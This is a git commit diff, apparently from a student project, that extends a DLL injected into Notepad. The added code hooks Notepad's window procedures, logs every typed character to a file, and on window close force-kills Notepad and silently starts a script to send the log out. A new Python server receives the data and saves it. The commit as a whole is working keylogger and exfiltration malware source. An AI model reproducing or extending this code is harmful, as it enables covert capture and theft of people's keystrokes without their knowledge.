8bde313db165085af00007fffe1fbdc3a4ce1923
איתן ברקת <eitan.bareket@office.eduil.org>
2018-12-30 23:54:29 +0200

    send to server by socket

--- myDLL2/Source.c
+++ myDLL2/Source.c
@@ -4,8 +4,9 @@
 #include <string.h>
 
 LONG_PTR previous_func = NULL;
-int i = 0;
-char dest[] = "Hello this is ethan i hack you! LOL";
+int i = -1;
+//char dest[] = "Hello this is ethan i hack you! LOL";
+
 
 
 char* read_line(char *str, int n, FILE *stream)
@@ -18,21 +19,60 @@ char* read_line(char *str, int n, FILE *stream)
 	return str;
 }
 
-void copy_file(char *dest) {
+void file2buffer(char *dest) {
 
 	FILE *fp = fopen("C:\\Users\\Ethan\\Desktop\\C\\TroySous_ETHAN\\hack.txt", "r");
 	read_line(dest, 40, fp);
 }
 
-LRESULT CALLBACK WindowProc(
+
+void char2file(char c) {
+	FILE *fp = fopen("C:\\Users\\Ethan\\Desktop\\C\\TroySous_ETHAN\\hack.txt", "a+");
+	const char* write_format = "%c";
+	/*if (c == 8) {
+		fseek(fp, i-1, SEEK_CUR);
+		fprintf(fp, write_format, " ");
+		fseek(fp, i, SEEK_CUR);
+	}*/
+	
+	
+	fprintf(fp, write_format, c);
+	i++;
+	fclose(fp);
+
+}
+
+
+LRESULT CALLBACK WindowProcParent(
+	_In_ HWND   hwnd,
+	_In_ UINT   uMsg,
+	_In_ WPARAM wParam,
+	_In_ LPARAM lParam
+) {
+	switch (uMsg)
+	{
+	case WM_CLOSE:
+		WinExec("taskkill /IM \"notepad.exe\" /F", SW_HIDE);
+		system("start pythonw C:\\Users\\Ethan\\Desktop\\C\\TroySous_ETHAN\\send_client.pyw");
+	
+	default:
+		return DefWindowProc(hwnd, uMsg, wParam, lParam);
+	}
+	return 0;
+}
+
+
+LRESULT CALLBACK WindowProcChild(
 	_In_ HWND   hwnd,
 	_In_ UINT   uMsg,
 	_In_ WPARAM wParam,
 	_In_ LPARAM lParam
 )
 {
+#pragma region change to "ihavk you"
 	//MessageBoxW(NULL, L"3", L"myDLL", MB_OKCANCEL);
-	char c;
+	/*
+				char c;
 	if (uMsg == WM_CHAR)
 	{
 		if (i != 37) {
@@ -42,18 +82,32 @@ LRESULT CALLBACK WindowProc(
 		}
 		else
 			wParam = NULL;
-	}
+	}*/
+
 	//MessageBoxW(NULL, L"4", L"myDLL", MB_OKCANCEL);
+#pragma endregion
+	
+	if (uMsg == WM_CHAR)
+	{
+		if (wParam == 13) {
+			wParam = '\n';
+			char2file(wParam);
+			wParam = 13;
+		}
+		else
+			char2file(wParam);
+	}
 	
 	return CallWindowProcA(previous_func , hwnd, uMsg, wParam, lParam);
 }
 
 void fuckwindow() {
 	HWND hparent = FindWindowExA(NULL,NULL, "Notepad", NULL );
+	SetWindowLongPtrA(hparent, GWLP_WNDPROC, (LONG_PTR)WindowProcParent);
 	HWND hedit = FindWindowExA(hparent,NULL,"Edit",NULL);
 	previous_func = GetWindowLongPtrA(hedit, GWLP_WNDPROC);
 	//MessageBoxW(NULL, L"2", L"myDLL", MB_OKCANCEL);
-	SetWindowLongPtrA(hedit, GWLP_WNDPROC,(LONG_PTR)WindowProc);
+	SetWindowLongPtrA(hedit, GWLP_WNDPROC,(LONG_PTR)WindowProcChild);
 }
 
 
@@ -68,6 +122,7 @@ BOOL APIENTRY DllMain(
 
 		fuckwindow();
 	}
+	
 	
 
 	return TRUE;
---
+++ recv_server.py
@@ -0,0 +1,25 @@
+import socket
+
+
+print("trying to socket")
+server_socket = socket.socket()
+server_socket.bind(('', 5566))
+print("server demareeeeee")
+
+server_socket.listen()
+
+print("a l ecouteeeeee")
+connected_socket , address = server_socket.accept()
+print("client conecteeeeeeee")
+
+data = connected_socket.recv(1024)
+data = data.decode("utf8")
+
+f= open("copied.txt","w+")
+f.write(data)
+
+print(data)
+
+
+
+server_socket.close()
